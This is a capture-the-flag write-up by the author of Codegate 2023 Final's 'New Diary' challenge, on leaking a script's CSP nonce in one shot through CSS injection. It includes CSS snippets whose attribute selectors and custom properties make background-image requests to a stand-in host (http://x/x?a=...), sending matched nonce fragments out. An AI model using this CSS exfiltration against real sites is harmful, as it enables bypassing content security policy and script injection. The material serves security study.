# New Diary
This is the unintentional solution for Codegate 2023 Final.
The original challenge uses the back-forward cache in browsers to leak 1 byte nonce each time. In this challenge, we narrow the limitation so that you only have one shot to leak all nonce by add `no-cache`.

## Solution
You can find many blogs on the Internet. I don't want to write again :).

## About CSS leakage
In this official writeup, I just want to emphasize the key point: CSS leakage.

It is well-known that we can use the CSS `background-image` to load the URL and leak the nonce. There are only two solutions on the Internet since the time I wrote this challenge:

- Leak one byte nonce and regenerate the CSS.
- https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b

None of these could work since we only have one shot and we cannot control the server where the CSS file are hosted.

**Interestingly, This challenge was made in August with no similar methods on the Internet. However, in September, another independent security researcher in SonarSource published almost the same [solution](https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/). This greatly reduced the difficulty of this challenge :(.**

## About CSS matcher
Another problem in this challenge is how to match the nonce in CSS. You cannot simply use `script[nonce*="aaa"] {background-image: xxx}` since chrome will only render the final matched attribute, which means only the later one can work:
```
script[nonce*="aaa"] {background-image: aaa}
script[nonce*="aab"] {background-image: aab}
```

There are several ways in others' writeup. But I use the custom attributes to achieve this:
```
script[nonce*="aaa"] {
    --xaaa: url(http://x/x?a=aaa) !important;
}
script[nonce*="aab"] {
    --xaab: url(http://x/x?a=aab) !important;
}

script {
    --xaaa: url("/");
    --xaab: url("/");
    background-image: var(--xaaa), var(--xaab);
}
```
All matched attributes will override the default URL in this example.